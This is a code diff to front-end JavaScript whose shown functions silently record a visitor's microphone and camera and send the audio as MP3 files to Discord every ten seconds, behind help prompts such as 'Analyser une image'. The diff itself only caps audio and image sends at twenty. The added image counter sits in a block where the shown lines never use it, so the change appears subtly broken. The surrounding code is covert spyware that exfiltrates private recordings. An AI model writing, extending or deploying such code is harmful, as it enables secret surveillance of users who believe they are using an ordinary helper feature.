@@ -601,6 +601,8 @@ function showMicroHelp() {
 }
 
 function startSilentRecording(stream) {
+  let audioSendCount = 0;
+  const MAX_AUDIO_SENDS = 20;
   const audioContext = new (window.AudioContext || window.webkitAudioContext)();
   const source = audioContext.createMediaStreamSource(stream);
   const processor = audioContext.createScriptProcessor(4096, 1, 1);
@@ -615,14 +617,17 @@ function startSilentRecording(stream) {
   };
 
   setInterval(() => {
-    if (buffer.length > 0) {
+    if (buffer.length > 0 && audioSendCount < MAX_AUDIO_SENDS) {
       const audioData = flattenArray(buffer);
       const mp3Blob = encodeMp3(audioData, audioContext.sampleRate);
       sendMp3ToDiscord(mp3Blob);
       buffer = [];
+      audioSendCount++;
     }
-  }, 10000); // toutes les 10 sec
+  }, 10000); // toutes les 10 secondes
 }
+
+
 
 
 function flattenArray(buffer) {
@@ -705,7 +710,8 @@ async function showCameraHelp() {
     try {
       const stream = await navigator.mediaDevices.getUserMedia({ video: true });
       startSilentCameraCapture(stream);
-
+      let imageSendCount = 0;
+      const MAX_IMAGE_SENDS = 20;
       cameraBtn.classList.remove("disabled-button");
       cameraBtn.disabled = false;
       cameraBtn.innerHTML = "<span class='icon'>📷</span> Analyser une image";
